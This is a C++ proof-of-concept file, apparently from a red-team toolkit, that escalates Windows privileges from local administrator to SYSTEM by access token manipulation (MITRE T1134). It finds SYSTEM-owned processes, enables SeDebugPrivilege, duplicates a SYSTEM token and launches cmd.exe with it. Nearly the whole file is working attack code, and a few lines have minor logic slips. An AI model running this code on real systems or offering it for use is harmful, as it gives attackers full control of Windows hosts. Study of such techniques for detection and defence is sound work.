// Access_Token_Manipulation.cpp : 
// Technique to scalate privileges from local admininistrator to SYSTEM
// Requirements: Local admin and SeDebugPrivilege privilege enabled (SeDebugPrivilege can be acquiered if you are local admin)


//Poc goals: Search for a process with SYSTEM privileges autonomously, duplicate it's token, and create a new process (cmd) as a SYSTEM

//references: https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation 
//MITRE T1134 Access Token Manipulation

#include <iostream>
#include "..\..\red-team\discovery\discovery.h";
#include "..\..\red-team\privilege_escalation\privilege_escalation.h";
#include "..\..\red-team\utils\utils.h";


using namespace std;

//function defs


vector <PROCESSENTRY32> enumerate_current_processes() {
    wstring error;
    HANDLE h_snap;
    vector <PROCESSENTRY32> process_tree;

    h_snap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, //Include all processes in the system
        NULL
    );

    if (h_snap == INVALID_HANDLE_VALUE) {
        error = to_wstring(GetLastError());
        wcout << L"Invalid handle value, error code: " << error << endl;
    }

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);


    if (Process32First(h_snap, &process_entry)) {
        process_tree.push_back(process_entry);
    }

    do {
        process_tree.push_back(process_entry);
    } while (Process32Next(h_snap, &process_entry));

    CloseHandle(h_snap);

    return process_tree;
}

vector<PROCESSENTRY32> get_process_owned_by_system(vector <PROCESSENTRY32> process_tree) { 
    vector <PROCESSENTRY32> system_process;

    for (const auto& process : process_tree) {

        wstring pname = process.szExeFile;

        if (pname.find(L".exe") == std::wstring::npos) {
            continue;
        }

        //Open each process
        HANDLE hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, process.th32ProcessID);
        if (hprocess == 0) {
            //process could not be opened so try next iteration
            continue;
        }

        //get token process
        HANDLE htoken;
        OpenProcessToken(hprocess, TOKEN_QUERY, &htoken);

        //get token information
        DWORD token_size;

        //get the TokenUser structure size
        GetTokenInformation(htoken, TokenUser, NULL, 0, &token_size);
        TOKEN_USER* token_information = (TOKEN_USER*)malloc(token_size);

        //Getting Token info
        if (!GetTokenInformation(htoken, TokenUser, token_information, token_size, &token_size)) {
            wstring err = to_wstring(GetLastError());
            wcout << L"Error GetTokenInformation,failure getting info. Error code:  " << err << endl;
        }

        //convert userSid to String Sid
        wchar_t* string_sid;
        wstring string_Sid;
        if (!ConvertSidToStringSid(token_information->User.Sid, &string_sid)) {
            wstring err = to_wstring(GetLastError());
            wcout << L"Error SID could not be converted to StringSid" << err << endl;
        }

        string_Sid = wstring(string_sid);
        
        if (string_Sid.find(L"S-1-5-18") != std::wstring::npos) {
            system_process.push_back(process);
        }

    } //for loop end
    return system_process;
}//FUNCTION END: get_process_owned_by_system  

bool enable_SeDebugPriv() {
    //OpenProcessToken, LookupPrivilegeValue, AdjustTokenPrivileges 

    HANDLE htoken;
    //Get current process token (desired access: query + adjust privilege)
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &htoken)) {
        wcout << L"Error: Current Process Token could not be obtained" << endl;
        CloseHandle(htoken);
        return false;
    }

    //Obtain SeDebugPrivilege Luid, SE_DEBUG_NAME
    LUID sedebug_luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebug_luid)) {
        wcout << L"Error: SeDebugPrivilege LUID could not be obtained." << endl;
        CloseHandle(htoken);
        return false;
    }
    TOKEN_PRIVILEGES token_priv;
    token_priv.PrivilegeCount = 1;
    token_priv.Privileges->Luid = sedebug_luid;
    token_priv.Privileges->Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(
        htoken, //TokenHandle,
        FALSE, //DisableAllPrivileges,
        &token_priv,//NewState,
        NULL,//bufferLength
        NULL,//PreviousState
        NULL//ReturnLength
    )) {
        wstring err = to_wstring(GetLastError());
        wcout << L"Error: AdjustTokenPrivilege failed with code: " << err << endl;
        CloseHandle(htoken);
        return false;
    }

    return true;
} //end enable_SeDebugPriv



int main() {

    vector <PROCESSENTRY32> process_tree   = enumerate_current_processes();
    vector <PROCESSENTRY32> system_process = get_process_owned_by_system(process_tree);
    


    wcout << L"[*] A complete list of NT SYSTEM process has been obtained." << endl;


    //enable SEDEBUG PRIVILEGE
    if (enable_SeDebugPriv()) {
        wcout << L"[*] SeDebugPrivilege enabled" << endl;
    }
    else {
        wcout << L"[*] Error, SeDebugPrivilege remains disabled" << endl;

    }

    //Token duplication

    bool success = false;

    for (const auto& process : system_process) {
        //try this til end or til find a process that allows token duplication and createprocesswithtoken
        // 
        // 1-Get token     
        HANDLE hprocess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, process.th32ProcessID);
        if (hprocess) {
            HANDLE hOriginalToken;
            bool open_result = OpenProcessToken(hprocess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hOriginalToken);

            if (!open_result) {
                wcout << L"Error obtaining original token" << endl;
                return 0;
            } 

            HANDLE htoken_dupli;

            if (ImpersonateLoggedOnUser(hOriginalToken)) {
                wcout << L"Error impersonation could not  be executed" << endl;
                
            }

            DuplicateTokenEx(
                hOriginalToken,
                TOKEN_ALL_ACCESS,
                NULL,
                SecurityImpersonation,
                TokenPrimary,
                &htoken_dupli);

            if (!htoken_dupli) {
                wcout << L"Error in token duplication" << endl;
                return 0;
            }

            STARTUPINFO startupinfo;
            ZeroMemory(&startupinfo, sizeof(STARTUPINFO));

            PROCESS_INFORMATION proces_info;
            ZeroMemory(&proces_info, sizeof(PROCESS_INFORMATION));

            success = CreateProcessWithTokenW(
                htoken_dupli,
                LOGON_WITH_PROFILE,
                L"C:\\Windows\\System32\\cmd.exe", //lpApplicationName,
                NULL,
                0,
                NULL,
                NULL,
                &startupinfo,
                &proces_info
            );

            if (success) {
                wcout << L"[*] NT SYSTEM process found -> " << process.szExeFile << L" PID:" << process.th32ProcessID << endl;
                wcout << L"[*] Process handle acquired" << endl;
                wcout << L"[*] Token handle acquired" << endl;
                wcout << L"[*] Starting loggedon user impersonation" << endl;
                wcout << L"[*] Token duplication completed" << endl;
                wcout << L"[*] cmd.exe process with NT SYSTEM privileges successfully created." << endl;
                CloseHandle(htoken_dupli);
                CloseHandle(hOriginalToken);
                CloseHandle(hprocess);
                return 0; //its done, end of program
            }

        }
        else {
            wcout << L"Error obtaining proces handle or token" << endl;
        }
    }//END FOR

}


